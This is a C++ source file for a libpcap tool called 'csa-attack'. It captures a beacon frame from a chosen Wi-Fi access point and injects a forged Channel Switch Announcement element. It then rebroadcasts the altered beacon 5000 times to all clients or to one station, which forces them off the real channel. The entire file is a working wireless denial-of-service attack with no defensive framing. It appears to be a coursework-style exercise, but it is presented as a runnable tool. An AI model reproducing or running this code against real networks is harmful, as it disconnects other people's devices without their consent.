#include <pcap.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <ifaddrs.h>
#include <stdio.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <array>
#include <thread>
#include <chrono>
#include <vector>
#include <string>
#include <utility>
#include <cstring>
#include <map>
#include <iomanip>
#include "beacon.h"
#include "mac.h"

using namespace std;

void usage()
{
    printf("syntax: csa-attack <interface> <ap-mac> [station-mac] \n");
    printf("sample: csa-attack wlan0 AA:BB:CC:DD:EE:FF\n");
}

bool check_beacon_frame(const uint8_t *frame_ptr, size_t length)
{
    if (length < 2)
    {
        return false;
    }

    const uint16_t *type_sub_type_field = reinterpret_cast<const uint16_t *>(frame_ptr);
    uint16_t type_sub_type = ntohs(*type_sub_type_field); // 네트워크 바이트 순서를 호스트 바이트 순서로 변환

    // Beacon frame의 타입 및 서브타입 값은 0x8000
    return type_sub_type == 0x8000;
}

void adjust_offset_for_boundary(size_t &offset, size_t field_size)
{
    if (field_size % 2 == 0)
    {
        offset = (offset + 1) & ~1; // 2바이트 경계에 맞추기
    }
}

void beacon_process(struct dot11 *header, struct pcap_pkthdr *pcap_header, macpack macset)
{
    if (header->it_version != 0)
    {
        printf("packet's version must be 0 \n");
        return;
    }

    int radiolength = header->it_len;

    size_t length = pcap_header->caplen;

    if (length < radiolength + 16)
    {
        printf("Packet too short for BSSID\n");
        return;
    }

    uint8_t *dmac_ptr = reinterpret_cast<uint8_t *>(header) + radiolength + 4;
    uint8_t *smac_ptr = reinterpret_cast<uint8_t *>(header) + radiolength + 10;

    memcpy(dmac_ptr, &macset.dmac, sizeof(Mac));
    memcpy(smac_ptr, &macset.smac, sizeof(Mac));

    const size_t ieee80211_header_length = 24;

    // 비콘 프레임 페이로드 시작점
    uint8_t *frame_payload_ptr = reinterpret_cast<uint8_t *>(header) + radiolength + ieee80211_header_length;
    uint8_t *tagged_fix_ptr = frame_payload_ptr;

    // Assuming tagged_fix_ptr is already defined and points to the tagged section

    uint8_t *tagged_ptr = tagged_fix_ptr + 12;
    uint8_t *next_tag_ptr;

    bool insertAtEnd = true;

    while (true)
    {
        uint8_t tag_idx = *tagged_ptr;
        uint8_t tag_len = *(tagged_ptr + 1);
        if (tagged_ptr >= reinterpret_cast<uint8_t *>(header) + length - 2)
        {
            break;
        }

        if (tag_idx > 0x25)
        {
            size_t data_after_tagged_ptr = length - (tagged_ptr - reinterpret_cast<uint8_t *>(header)) - tag_len - 2; // -2 for tag_idx and tag_len

            memmove(tagged_ptr + 5, tagged_ptr, data_after_tagged_ptr);

            uint8_t insert_data[] = {0x25, 0x03, 0x01, 0x24, 0x03};
            memcpy(tagged_ptr, insert_data, sizeof(insert_data));

            tagged_ptr += sizeof(insert_data);

            size_t remain_data_len = data_after_tagged_ptr - 5;

            insertAtEnd = false;

            break;
        }
        tagged_ptr += 2 + tag_len;
    }

    if (insertAtEnd)
    {
        uint8_t insert_data[] = {0x25, 0x03, 0x01, 0x24, 0x03};

        if (reinterpret_cast<uint8_t *>(header) + length - tagged_ptr >= sizeof(insert_data))
        {
            memcpy(tagged_ptr, insert_data, sizeof(insert_data));
        }
        else
        {
            printf("Not enough space to insert data at the end\n");
        }
    }
}

int main(int argc, char *argv[])
{
    if (argc < 3)
    {
        usage();
        return -1;
    }

    char *dev = argv[1];
    Mac apmac(argv[2]);

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

    if (handle == nullptr)
    {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    macpack macset;

    switch (argc)
    {
    case 3: // broad
    {
        macset.dmac = Mac(Mac::broadcastMac());
        macset.smac = apmac;
        break;
    }
    case 4: // uni staion
    {
        macset.dmac = Mac(argv[3]);
        macset.smac = apmac;
        break;
    }
    default:
        usage();
        return -1;
    }

    struct pcap_pkthdr *header;
    const uint8_t *packet;
    u_char *reply1 = nullptr;

    while (true)
    {
        int ret = pcap_next_ex(handle, &header, &packet);
        if (ret == 0)
        {
            printf("Timeout, no packet received\n");
            continue;
        }
        if (ret == -1 || ret == -2)
        {
            fprintf(stderr, "pcap_next_ex error: %s\n", pcap_geterr(handle));
            break;
        }

        struct dot11 *radiotap_hdr = (struct dot11 *)packet;
        const size_t ieee80211_header_length = 24;

        if (check_beacon_frame(reinterpret_cast<const uint8_t *>(radiotap_hdr) + (radiotap_hdr->it_len), header->caplen - (radiotap_hdr->it_len)))
        {
            beacon_process(radiotap_hdr, header, macset);
            break;
        }
        else
        {
            continue;
        }
    }

    for (int i = 0; i < 5000; ++i)
    {
        if (pcap_sendpacket(handle, packet, header->len + 5) != 0)
        {
            fprintf(stderr, "Error sending the packet: %s\n", pcap_geterr(handle));
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(5));
    }

    pcap_close(handle);

    return 0;
}